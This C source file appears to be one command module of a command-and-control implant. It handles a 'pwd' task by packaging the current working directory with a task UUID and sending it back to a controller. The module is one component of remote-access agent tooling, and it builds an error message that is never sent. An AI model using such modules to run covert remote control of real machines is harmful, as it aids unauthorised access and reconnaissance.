#include "WrapPwd.h"
#include "BasePwd.h"

BOOL wrapPwd(PParser arguments)
{
    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);

    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);

    PPackage output = newPackage(0, FALSE);
    
    char result[MAX_PATH_SIZE];
    result[0] = '\0'; // Initialize the result string
    BOOL success = basePwd(result, MAX_PATH_SIZE);

    if (!success)
    {
        addString(output, "[PWD] Error getting current working directory!\n", FALSE);
    }
    else
    {
        // Add the result to the output package
        addBytes(responseTask, (PBYTE)result, CustomStrLen(result), TRUE);
    }

    // Send the output package
    Parser* ResponseParser = sendPackage(responseTask);

    return success;
}